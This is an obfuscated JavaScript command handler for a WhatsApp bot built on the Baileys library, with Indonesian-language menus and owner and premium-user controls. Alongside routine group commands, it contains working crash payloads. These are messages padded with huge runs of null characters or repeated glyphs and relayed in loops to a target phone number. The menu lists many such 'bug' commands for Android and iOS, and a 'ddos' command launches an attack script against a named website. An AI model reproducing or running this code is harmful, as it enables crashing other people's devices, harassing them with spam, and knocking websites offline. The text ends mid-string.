const _0x5d39ec = function () {
  let _0x5c2a70 = true;
  return function (_0x4d3939, _0x1a57c5) {
    const _0x3c0522 = _0x5c2a70 ? function () {
      if (_0x1a57c5) {
        const _0x21d898 = _0x1a57c5.apply(_0x4d3939, arguments);
        _0x1a57c5 = null;
        return _0x21d898;
      }
    } : function () {};
    _0x5c2a70 = false;
    return _0x3c0522;
  };
}();
const _0x3159d2 = _0x5d39ec(this, function () {
  return _0x3159d2.toString().search('(((.+)+)+)+$').toString().constructor(_0x3159d2).search("(((.+)+)+)+$");
});
_0x3159d2();
const _0x486106 = function () {
  let _0x22c88d = true;
  return function (_0x360bd9, _0x2129ad) {
    const _0xa174da = _0x22c88d ? function () {
      if (_0x2129ad) {
        const _0x489aff = _0x2129ad.apply(_0x360bd9, arguments);
        _0x2129ad = null;
        return _0x489aff;
      }
    } : function () {};
    _0x22c88d = false;
    return _0xa174da;
  };
}();
const _0x16f74a = _0x486106(this, function () {
  const _0x3fee15 = function () {
    let _0x21cd9c;
    try {
      _0x21cd9c = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x54fdb6) {
      _0x21cd9c = window;
    }
    return _0x21cd9c;
  };
  const _0xbae17d = _0x3fee15();
  const _0x572280 = _0xbae17d.console = _0xbae17d.console || {};
  const _0x5405e9 = ["log", "warn", "info", "error", 'exception', "table", "trace"];
  for (let _0x415203 = 0x0; _0x415203 < _0x5405e9.length; _0x415203++) {
    const _0x1805de = _0x486106.constructor.prototype.bind(_0x486106);
    const _0xb8dd3f = _0x5405e9[_0x415203];
    const _0x3a72a6 = _0x572280[_0xb8dd3f] || _0x1805de;
    _0x1805de.__proto__ = _0x486106.bind(_0x486106);
    _0x1805de.toString = _0x3a72a6.toString.bind(_0x3a72a6);
    _0x572280[_0xb8dd3f] = _0x1805de;
  }
});
_0x16f74a();
require('./config');
const {
  downloadContentFromMessage,
  makeInMemoryStore,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const {
  isUrl,
  sleep,
  await,
  getGroupAdmins,
  fetchJson
} = require('./lib/myfunc.js');
const fs = require('fs');
const util = require('util');
const chalk = require('chalk');
const {
  exec,
  spawn,
  execSync
} = require("child_process");
ownerNumberr = global.ownerNumber;
ownerNamee = global.ownerName;
botNamee = global.botName;
Leccy_Auto_Typing = global.Auto_Typing;
Leccy_Auto_Recording = global.Auto_Recording;
Leccy_Auto_RecordType = global.Auto_RecordType;
Leccy_Auto_ReadPesan = global.Auto_ReadPesan;
tiktokauto = global.TiktokAutoDownload;
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const tbsm = fs.readFileSync("./lib/strava.jpg");
module.exports = async (_0x57c724, _0x32ea25, _0x54f8cb) => {
  try {
    const {
      fromMe: _0x33f6d5,
      isBaileys: _0x7af8e7,
      isQuotedMsg: _0x1c9ec7,
      quotedMsg: _0x212648,
      mentioned: _0x1d3901
    } = _0x32ea25;
    if (_0x32ea25.key && _0x32ea25.key.remoteJid === "status@broadcast") {
      return;
    }
    const _0x37d372 = getContentType(_0x32ea25.message);
    const _0x529e16 = _0x32ea25.key.remoteJid;
    const _0x298e5e = _0x37d372 === 'conversation' && _0x32ea25.message.conversation ? _0x32ea25.message.conversation : _0x37d372 == 'imageMessage' && _0x32ea25.message.imageMessage.caption ? _0x32ea25.message.imageMessage.caption : _0x37d372 == "documentMessage" && _0x32ea25.message.documentMessage.caption ? _0x32ea25.message.documentMessage.caption : _0x37d372 == "videoMessage" && _0x32ea25.message.videoMessage.caption ? _0x32ea25.message.videoMessage.caption : _0x37d372 == "extendedTextMessage" && _0x32ea25.message.extendedTextMessage.text ? _0x32ea25.message.extendedTextMessage.text : _0x37d372 == "buttonsResponseMessage" && _0x32ea25.message.buttonsResponseMessage.selectedButtonId ? _0x32ea25.message.buttonsResponseMessage.selectedButtonId : _0x37d372 == "templateButtonReplyMessage" && _0x32ea25.message.templateButtonReplyMessage.selectedId ? _0x32ea25.message.templateButtonReplyMessage.selectedId : '';
    const _0x15d293 = _0x37d372 === 'conversation' && _0x32ea25.message.conversation ? _0x32ea25.message.conversation : _0x37d372 === "imageMessage" && _0x32ea25.message.imageMessage.caption ? _0x32ea25.message.imageMessage.caption : _0x37d372 === "videoMessage" && _0x32ea25.message.videoMessage.caption ? _0x32ea25.message.videoMessage.caption : _0x37d372 === 'extendedTextMessage' && _0x32ea25.message.extendedTextMessage.text ? _0x32ea25.message.extendedTextMessage.text : _0x37d372 === "buttonsResponseMessage" && _0x212648.fromMe && _0x32ea25.message.buttonsResponseMessage.selectedButtonId ? _0x32ea25.message.buttonsResponseMessage.selectedButtonId : _0x37d372 === "templateButtonReplyMessage" && _0x212648.fromMe && _0x32ea25.message.templateButtonReplyMessage.selectedId ? _0x32ea25.message.templateButtonReplyMessage.selectedId : _0x37d372 === "messageContextInfo" ? _0x32ea25.message.buttonsResponseMessage?.["selectedButtonId"] || _0x32ea25.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] : _0x37d372 == "listResponseMessage" && _0x212648.fromMe && _0x32ea25.message.listResponseMessage.singleSelectReply.selectedRowId ? _0x32ea25.message.listResponseMessage.singleSelectReply.selectedRowId : '';
    const _0xf07829 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(_0x298e5e) ? _0x298e5e.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.';
    const _0x54f87b = _0x298e5e.replace(_0xf07829, '').trim().split(/ +/).shift().toLowerCase();
    const _0x2fbf9b = _0x298e5e.trim().split(/ +/).slice(0x1);
    const _0x55a774 = _0x529e16.endsWith("@g.us");
    const _0x2b4a28 = _0x57c724.user.id.split(':')[0x0];
    const _0x66df79 = _0x32ea25.key.fromMe ? _0x57c724.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x57c724.user.id : _0x32ea25.key.participant || _0x32ea25.key.remoteJid;
    const _0x1a21c9 = _0x66df79.split('@')[0x0];
    const _0x3b4554 = [global.ownerNumber, ...premium].includes(_0x1a21c9);
    const _0x57c09c = global.ownerNumber.includes(_0x1a21c9);
    const _0x5764c8 = _0x2b4a28.includes(_0x1a21c9);
    const _0x575cb3 = _0x55a774 ? await _0x57c724.groupMetadata(_0x529e16) : '';
    const _0x583eb9 = _0x55a774 ? _0x575cb3.subject : '';
    const _0x587200 = _0x55a774 ? _0x575cb3.participants : '';
    const _0x5b2215 = _0x55a774 ? getGroupAdmins(_0x587200) : '';
    const _0x217110 = _0x5b2215.includes(_0x2b4a28 + "@s.whatsapp.net") || false;
    const _0x2c3e5b = _0x5b2215.includes(_0x66df79) || false;
    const _0x39d45d = function (_0x2ba9c6) {
      var _0x2ba9c6 = Number(_0x2ba9c6);
      var _0x447e98 = Math.floor(_0x2ba9c6 / 86400);
      var _0x223e53 = Math.floor(_0x2ba9c6 % 86400 / 0xe10);
      var _0x547ed4 = Math.floor(_0x2ba9c6 % 0xe10 / 0x3c);
      var _0x206ff0 = Math.floor(_0x2ba9c6 % 0x3c);
      var _0x3369ad = _0x447e98 > 0x0 ? _0x447e98 + (_0x447e98 == 0x1 ? " Hari, " : " Hari, ") : '';
      var _0x780571 = _0x223e53 > 0x0 ? _0x223e53 + (_0x223e53 == 0x1 ? " Jam, " : " Jam, ") : '';
      var _0x41e4aa = _0x547ed4 > 0x0 ? _0x547ed4 + (_0x547ed4 == 0x1 ? " Menit, " : " Menit, ") : '';
      var _0x333e8c = _0x206ff0 > 0x0 ? _0x206ff0 + (_0x206ff0 == 0x1 ? " Detik" : " Detik") : '';
      return _0x3369ad + _0x780571 + _0x41e4aa + _0x333e8c;
    };
    const _0x31f1ae = async _0x46efd0 => {
      await _0x57c724.sendMessage(_0x529e16, {
        'text': _0x46efd0
      }, {
        'quoted': _0x32ea25
      });
    };
    const _0x98762a = async _0x503aad => {
      _0x57c724.sendMessage(_0x529e16, {
        'react': {
          'text': _0x503aad,
          'key': _0x32ea25.key
        }
      });
    };
    const _0x29d3e4 = async _0x22a782 => {
      _0x57c724.sendMessage(_0x529e16, {
        'image': tbsm,
        'caption': _0x22a782,
        'contextInfo': {
          'mentionedJid': [_0x66df79],
          'forwardingScore': 0x270f,
          'isForwarded': true
        }
      }, {
        'quoted': _0x32ea25
      });
    };
    async function _0x35ebcd(_0x15c6d4, _0x1d5be4) {
      for (let _0x394501 = 0x0; _0x394501 < _0x1d5be4; _0x394501++) {
        var _0x3f7df2 = generateWAMessageFromContent(_0x15c6d4, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'interactiveMessage': {
                'header': {
                  'title': '',
                  'subtitle': " "
                },
                'body': {
                  'text': "ຮ₮ཞศV꙰ศ ๖ມG꙰"
                },
                'footer': {
                  'text': "›#leccofficial"
                },
                'nativeFlowMessage': {
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{ display_text : 'ຮ₮ཞศV꙰ศ ๖ມG꙰', url : , merchant_url :  }"
                  }],
                  'messageParamsJson': "\0".repeat(0xf4240)
                }
              }
            }
          }
        }), {
          'userJid': _0x15c6d4
        });
        await _0x57c724.relayMessage(_0x15c6d4, _0x3f7df2.message, {
          'messageId': _0x3f7df2.key.id
        });
      }
    }
    async function _0x5c1db2(_0x3ba5bd) {
      var _0x4d8828 = generateWAMessageFromContent(_0x3ba5bd, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "ຮ₮ཞศV꙰ศ ๖ມG꙰"
              },
              'footer': {
                'text': "›#leccofficial"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : 'ຮ₮ཞศV꙰ศ ๖ມG꙰', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(0xf4240)
              }
            }
          }
        }
      }), {
        'userJid': _0x3ba5bd
      });
      await _0x57c724.relayMessage(_0x3ba5bd, _0x4d8828.message, {
        'participant': {
          'jid': _0x3ba5bd
        },
        'messageId': _0x4d8828.key.id
      });
    }
    async function _0x397632(_0x3cbe4d) {
      var _0x464b77 = generateWAMessageFromContent(_0x3cbe4d, proto.Message.fromObject({
        'listMessage': {
          'title': "⟠⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(0xe09c0),
          'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': 'anjay',
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': '4392524570816732',
              'jpegThumbnail': null
            },
            'businessOwnerJid': '0@s.whatsapp.net'
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x3cbe4d
      });
      await _0x57c724.relayMessage(_0x3cbe4d, _0x464b77.message, {
        'participant': {
          'jid': _0x3cbe4d
        },
        'messageId': _0x464b77.key.id
      });
    }
    async function _0x5ccf7b(_0x537533) {
      var _0x5846f7 = generateWAMessageFromContent(_0x537533, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x537533
      });
      await _0x57c724.relayMessage(_0x537533, _0x5846f7.message, {
        'participant': {
          'jid': _0x537533
        },
        'messageId': _0x5846f7.key.id
      });
    }
    async function _0x19c62e(_0x31e3a4) {
      _0x57c724.relayMessage(_0x31e3a4, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': _0x31e3a4,
            'participant': _0x31e3a4,
            'quotedMessage': {
              'conversation': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(0xc350)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x31e3a4
        }
      }, {
        'messageId': null
      });
    }
    async function _0xd5036c(_0x57a521) {
      _0x57c724.relayMessage(_0x57a521, {
        'paymentInviteMessage': {
          'serviceType': "UPI",
          'expiryTimestamp': Date.now() + 86400000
        }
      }, {
        'participant': {
          'jid': _0x57a521
        }
      });
    }
    async function _0x5816ad(_0x2ea9b6) {
      await _0x57c724.relayMessage(_0x2ea9b6, {
        'paymentInviteMessage': {
          'serviceType': 'FBPAY',
          'expiryTimestamp': Date.now() + 0x6c258c00
        }
      }, {
        'participant': {
          'jid': _0x2ea9b6
        }
      });
    }
    async function _0x546e56(_0x334fb6, _0x898460) {
      for (let _0x291aa7 = 0x0; _0x291aa7 < _0x898460; _0x291aa7++) {
        _0xd5036c(_0x334fb6);
        _0x5816ad(_0x334fb6);
        _0x19c62e(_0x334fb6);
        await sleep(0x1f4);
      }
    }
    async function _0x35c704(_0x9bccbf, _0x42da9f) {
      for (let _0x32a173 = 0x0; _0x32a173 < _0x42da9f; _0x32a173++) {
        _0x397632(_0x9bccbf);
        _0x5ccf7b(_0x9bccbf);
        _0x5c1db2(_0x9bccbf);
        await sleep(0x1f4);
      }
    }
    function _0x40d9e9(_0x23a18c, _0x203db4 = [], _0x32a9be) {
      if (_0x32a9be == null || _0x32a9be == undefined || _0x32a9be == false) {
        let _0xb1a433 = _0x57c724.sendMessage(_0x529e16, {
          'text': _0x23a18c,
          'mentions': _0x203db4
        }, {
          'quoted': _0x32ea25
        });
        return _0xb1a433;
      } else {
        let _0x5aff24 = _0x57c724.sendMessage(_0x529e16, {
          'text': _0x23a18c,
          'mentions': _0x203db4
        }, {
          'quoted': _0x32ea25
        });
        return _0x5aff24;
      }
    }
    if (Leccy_Auto_Typing) {
      _0x57c724.sendPresenceUpdate("composing", _0x529e16);
    }
    if (Leccy_Auto_Recording) {
      _0x57c724.sendPresenceUpdate('recording', _0x529e16);
    }
    if (Leccy_Auto_ReadPesan) {
      _0x57c724.readMessages([_0x32ea25.key]);
    }
    if (_0x55a774) {
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Group Chat :")));
      console.log(chalk.black(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x298e5e || _0x37d372)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x32ea25.pushName), chalk.yellow(_0x66df79.split('@')[0x0]) + "\n" + chalk.blueBright("=> in"), chalk.green(_0x583eb9, _0x529e16));
    } else {
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Private Chat :")));
      console.log(chalk.bgBlack(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x298e5e || _0x37d372)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x32ea25.pushName), chalk.yellow(_0x66df79.split('@')[0x0]) + "\n");
    }
    switch (_0x54f87b) {
      case "stopjadibot":
        if (!_0x57c09c && !_0x5764c8 && !_0x3b4554) {
          return _0x31f1ae("*Khusus Member Premium/Owner*");
        }
        if (!fs.existsSync('./database/jadibot/' + _0x66df79.split('@')[0x0])) {
          return _0x31f1ae("*Maaf, Kamu Tidak Terdaftar Jadibot!*");
        }
        exec("rm -r database/jadibot/" + _0x66df79.split('@')[0x0]);
        _0x31f1ae("*succesfully delete session ✓*");
        break;
      case "resetjadibot":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("Fitur ini Khusus Owner/Dev");
        }
        exec("rm -r database/jadibot/" + _0x66df79.split('@')[0x0]);
        _0x31f1ae("*succesfully restart session ✓*");
        await sleep(0xbb8);
        process.exit();
        break;
      case "listjadibot":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("*Khusus Member Premium/Owner*");
        }
        const {
          jadibot: _0xd46e70,
          conns: _0x296e9d
        } = require("./lib/jadibot");
        try {
          let _0x44785f = [...new Set([...global.conns.filter(_0x57af15 => _0x57af15.user).map(_0x3bc8b2 => _0x3bc8b2.user)])];
          te = "*List Jadibot*\n\n";
          for (let _0x278cf1 of _0x44785f) {
            y = await _0x57c724.decodeJid(_0x278cf1.id);
            te += " • Users : @" + y.split('@')[0x0] + "\n";
            te += " • Time Aktif : " + _0x278cf1.time + "\n\n";
          }
          _0x57c724.sendMessage(_0x529e16, {
            'text': te,
            'mentions': [y]
          }, {
            'quoted': _0x32ea25
          });
        } catch (_0x1b5d56) {
          _0x31f1ae("Belum Ada User Yang Jadibot");
        }
        break;
      case 'jadibot':
        {
          if (!_0x57c09c && !_0x5764c8 && !_0x3b4554) {
            return _0x31f1ae("*Khusus Member Premium/Owner*");
          }
          if (_0x55a774) {
            return _0x31f1ae("Maaf Kak Fitur Ini Hanya Bisa Digunakan Dichat Pribadi!");
          }
          botku = _0x66df79.split('@')[0x0];
          num = botku.replace(/[^0-9]/g, '');
          own = global.ownerBot;
          mynum = num + '@s.whatsapp.net';
          if (fs.existsSync("./database/jadibot/" + _0x66df79.split('@')[0x0])) {
            return _0x40d9e9("*mohon maaf* @" + _0x66df79.split('@')[0x0] + " ^_^\n*session kamu masih terdaftar.*\n\n*silahkan ketik* .stopjadibot\n*untuk menghapus session ✓*", [mynum]);
          }
          _0x31f1ae("*We are processing your request.*");
          const {
            jadibot: _0x1553f0,
            conns: _0x57e2dd
          } = require("./lib/jadibot");
          _0x1553f0(_0x57c724, num, _0x31f1ae, own);
          await sleep(0xdac);
          _0x31f1ae("*MASUKKAN CODE PAIRING DIBAWAH INI*\n*UNTUK MENJADI BOT SEMENTARA ✓*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code pairing dibawah ini\n\n*Code Pairing :* `" + global.codepairing + "`\n\n*Note:*\n_Code dapat expired kapan saja._\n_Jika code error silahkan ketik_ ⇩\n\n========[  !stopjadibot  ]========");
        }
        break;
      case "ddos":
      case 'mix':
        {
          if (!_0x57c09c && !_0x5764c8) {
            return _0x31f1ae("Fitur ini Khusus Owner/Dev");
          }
          if (!q.includes(" ")) {
            return _0x31f1ae("Use Methode: ." + _0x54f87b + " <target> <time>\nExaple: ." + _0x54f87b + " example.my.id 60");
          }
          const _0x4d4632 = q.substring(0x0, q.indexOf(" ") - 0x0);
          const _0x11c04d = q.substring(q.lastIndexOf(" ") + 0x1);
          _0x31f1ae("*Attack Website Telah Berhasil Dilakukan ✓*\n• *Target* : " + _0x4d4632 + "\n• *Time Attack* : " + _0x11c04d);
          exec("node lib/ddos.js " + _0x4d4632 + " " + _0x11c04d, {
            'maxBuffer': 1048576
          }, (_0x58a74b, _0x6af11e, _0x31eaca) => {
            if (_0x58a74b) {
              _0x31f1ae("Error: " + _0x58a74b.message);
              return;
            }
            if (_0x31eaca) {
              _0x31f1ae("Error: " + _0x31eaca);
              return;
            }
            _0x31f1ae("Success\n\n• Target: " + _0x4d4632 + ",\n• Time: " + _0x11c04d);
          });
        }
        break;
      case "block":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("Fitur ini Khusus Owner/Dev");
        }
        blockw = q.replace(/[^0-9]/g, '');
        let _0x1b59f1 = await _0x57c724.onWhatsApp(blockw + '@s.whatsapp.net');
        if (_0x1b59f1.length == 0x0) {
          return _0x31f1ae("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x2401b4 = blockw + "@s.whatsapp.net";
        await _0x57c724.updateBlockStatus(_0x2401b4, 'block').then(_0x2f543b => _0x31f1ae(JSON.stringify(_0x2f543b, null, 0x2)))['catch'](_0x4bddd3 => _0x31f1ae(JSON.stringify(_0x4bddd3, null, 0x2)));
        break;
      case "unblock":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("Fitur ini Khusus Owner/Dev");
        }
        blockww = q.replace(/[^0-9]/g, '');
        let _0x1ea713 = await _0x57c724.onWhatsApp(blockww + "@s.whatsapp.net");
        if (_0x1ea713.length == 0x0) {
          return _0x31f1ae("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x57e346 = blockww + "@s.whatsapp.net";
        await _0x57c724.updateBlockStatus(_0x57e346, 'unblock').then(_0x57cb11 => _0x31f1ae(JSON.stringify(_0x57cb11, null, 0x2)))['catch'](_0x3fc5df => _0x31f1ae(JSON.stringify(_0x3fc5df, null, 0x2)));
        break;
      case "leave":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("Fitur ini Khusus Owner/Dev");
        }
        if (!_0x55a774) {
          return _0x31f1ae("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        _0x31f1ae("Bye Everyone.");
        await _0x57c724.groupLeave(_0x529e16);
        break;
      case "shutdown":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("Fitur ini Khusus Owner/Dev");
        }
        _0x31f1ae('Goodbye🖐');
        await sleep(0xbb8);
        process.exit();
        break;
      case "restart":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("Fitur ini Khusus Owner/Dev");
        }
        _0x31f1ae("In Process...");
        exec("pm2 restart all");
        break;
      case "listprem":
        {
          if (!_0x57c09c && !_0x5764c8) {
            return _0x31f1ae("Fitur ini Khusus Owner/Dev");
          }
          let _0x28662f = JSON.parse(fs.readFileSync('./database/premium.json'));
          if (_0x28662f.length == 0x0) {
            return _0x31f1ae("_Tidak Ada Users Premium!!_");
          }
          var _0x37360d = "_*LIST USER PREMIUM*_\n*Total User :* " + premium.length + "\n\n";
          var _0x50f8da = 0x1;
          for (let _0x13e933 of _0x28662f) {
            _0x37360d += "User : " + _0x50f8da++ + "\nNumber : @" + _0x13e933 + "\n\n";
          }
          _0x57c724.sendTextWithMentions(_0x529e16, _0x37360d, _0x32ea25);
        }
        break;
      case "addprem":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("*Khusus Owner Leccy!*");
        }
        if (!_0x2fbf9b[0x0]) {
          return _0x31f1ae("Use " + (_0xf07829 + _0x54f87b) + " number\nExample " + (_0xf07829 + _0x54f87b) + " 628xxxxxxxx");
        }
        bnnd = q.replace(/[^0-9]/g, '');
        let _0x2d49eb = await _0x57c724.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x2d49eb.length == 0x0) {
          return _0x31f1ae("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        if (premium.includes(bnnd)) {
          return _0x31f1ae("_Nomor Tersebut Sudah Premium !!_");
        }
        premium.push(bnnd);
        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        let _0x52ce15 = bnnd + "@s.whatsapp.net";
        _0x40d9e9("*Sukses Menambahkan " + _0x52ce15.split('@')[0x0] + " Ke Database Users Premium*", [_0x52ce15]);
        break;
      case "delprem":
        if (!_0x57c09c && !_0x5764c8) {
          return _0x31f1ae("Fitur ini Khusus Owner/Dev");
        }
        if (!_0x2fbf9b[0x0]) {
          return _0x31f1ae("Use " + (_0xf07829 + _0x54f87b) + " number\nExample " + (_0xf07829 + _0x54f87b) + " 628xxxxx");
        }
        ya = q.replace(/[^0-9]/g, '');
        unp = premium.indexOf(ya);
        if (!premium.includes(ya)) {
          return _0x31f1ae("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Users Premium!!_");
        }
        premium.splice(unp, 0x1);
        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        let _0x4380f0 = ya + '@s.whatsapp.net';
        _0x40d9e9("*Sukses Menghapus " + _0x4380f0.split('@')[0x0] + " Didatabase Users Premium*", [_0x4380f0]);
        break;
      case "stv":
      case "menu":
        {
          aa = "```";
          bb = '`';
          penislu = fs.readFileSync("./index.js").toString();
          matches = penislu.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          countcs = matches.length;
          txt = "▱▰▱「 *STRAVA-V2* 」▱▰▱\n╭──────────────────\n│ *Botname* : " + global.botName + "\n│ *Ownername* : " + global.ownerName + "\n│ *Pengguna* : " + (_0x57c09c ? 'Owner' : "User") + "\n│ *Total Fitur* : " + countcs + "\n│ *Number* : @" + _0x66df79.split('@')[0x0] + "\n╰──────────────────\n┏❐ " + bb + "SIMPLE MENU" + bb + " ❐\n┃⭔.allmenu\n┃⭔.bugmenu\n┃⭔.ownermenu\n┃⭔.jadibotmenu\n┃⭔.groupmenu\n┗❐\n▬▭▬▭▬▭▬▭▬▭\n 「 *RUNTIME BOT* 」\n" + _0x39d45d(process.uptime()) + "\n▬▭▬▭▬▭▬▭▬▭▬▭";
          _0x29d3e4(txt);
        }
        break;
      case "bugmenu":
      case "ownermenu":
      case "groupmenu":
      case "jadibotmenu":
        {
          aa = "```";
          bb = '`';
          txt1 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "OWNER MENU" + bb + " ❐\n┃⭔.leave\n┃⭔.restart\n┃⭔.listprem\n┃⭔.totalcase\n┃⭔.shutdown\n┃⭔.join <linkgrup>\n┃⭔.block number\n┃⭔.unblock number\n┃⭔.delprem number\n┃⭔.addprem number\n┃⭔.mix <link> <time>\n┃⭔.ddos <link> <time>\n┃\n┗❐「 *STRAVA-V2* 」\n▬▭▬▭▬▭▬▭▬▭";
          txt2 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "JADIBOT MENU" + bb + " ❐\n┃⭔.stopjadibot\n┃⭔.resetjadibot\n┃⭔.listjadibot\n┃⭔.jadibot\n┃\n┗❐「 *STRAVA-V2* 」\n▬▭▬▭▬▭▬▭▬▭";
          txt3 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "GROUP MENU" + bb + " ❐\n┃⭔.open\n┃⭔.close\n┃⭔.linkgc\n┃⭔.linkgrup\n┃⭔.revoke\n┃⭔.hidetag teks\n┃⭔.kick @tag\n┃⭔.promote @tag\n┃⭔.demote @tag\n┃⭔.setname teks\n┃⭔.setdesc teks\n┃⭔.editinfo teks\n┃\n┗❐「 *STRAVA-V2* 」\n▬▭▬▭▬▭▬▭▬▭";
          txt4 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG SPAM-ANDRO" + bb + " ❐\n┃⭔.24j *<jumlah spam>*\n┃⭔.kill *<jumlah spam>*\n┃⭔.bug *<jumlah spam>*\n┃⭔.bom *<jumlah spam>*\n┃⭔.delay *<jumlah spam>*\n┃⭔.spam *<jumlah spam>*\n┃⭔.crash *<jumlah spam>*\n┃⭔.strava *<jumlah spam>*\n┃⭔.bugui *<jumlah spam>*\n┃⭔.1day *<jumlah spam>*\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG SPAM-IOS" + bb + " ❐\n┃⭔.ios *<jumlah spam>*\n┃⭔.ui-ios *<jumlah spam>*\n┃⭔.bl-ios *<jumlah spam>*\n┃⭔.ci-ios *<jumlah spam>*\n┃⭔.fc-ios *<jumlah spam>*\n┃⭔.stv-ios *<jumlah spam>*\n┃⭔.va-ios *<jumlah spam>*\n┃⭔.lec-ios *<jumlah spam>*\n┃⭔.blank-ios *<jumlah spam>*\n┃⭔.black-ios *<jumlah spam>*\n┃⭔.blank-ios *<jumlah spam>*\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG ANDRO-HIGH" + bb + " ❐\n┃⭔.xbutton 628XXXX,3\n┃⭔.xcrash 628XXXX,3\n┃⭔.xforce 628XXXX,3\n┃⭔.xbom 628XXXX,3\n┃⭔.xstik 628XXXX,3\n┃⭔.xlist 628XXXX,3\n┃⭔.x24j 628XXXX,3\n┃⭔.xuia 628XXXX,3\n┃⭔.xlec 628XXXX,3\n┃⭔.xva 628XXXX,3\n┃⭔.xta 628XXXX,3\n┃⭔.xvir 628XXXX,3\n┃⭔.xdoc 628XXXX,3\n┃⭔.xkill 628XXXX,3\n┃⭔.xbug 628XXXX,3\n┃⭔.xloc 628XXXX,3\n┃⭔.xhit 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG ANDRO-EASY" + bb + " ❐\n┃⭔.forcepc 628XXXX,3\n┃⭔.sendbug 628XXXX,3\n┃⭔.santetpc 628XXXX,3\n┃⭔.crashpc 628XXXX,3\n┃⭔.delaypc 628XXXX,3\n┃⭔.spampc 628XXXX,3\n┃⭔.virgam 628XXXX,3\n┃⭔.bugpc 628XXXX,3\n┃⭔.unlipc 628XXXX,3\n┃⭔.lolpc 628XXXX,3\n┃⭔.lecpc 628XXXX,3\n┃⭔.tetpc 628XXXX,3\n┃⭔.rorrpc 628XXXX,3\n┃⭔.docpc 628XXXX,3\n┃⭔.stvpc 628XXXX,3\n┃⭔.vaspc 628XXXX,3\n┃⭔.trolipc 628XXXX,3\n┃⭔.pollpc 628XXXX,3\n┗❐\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "BUG IOS-IPONG" + bb + " 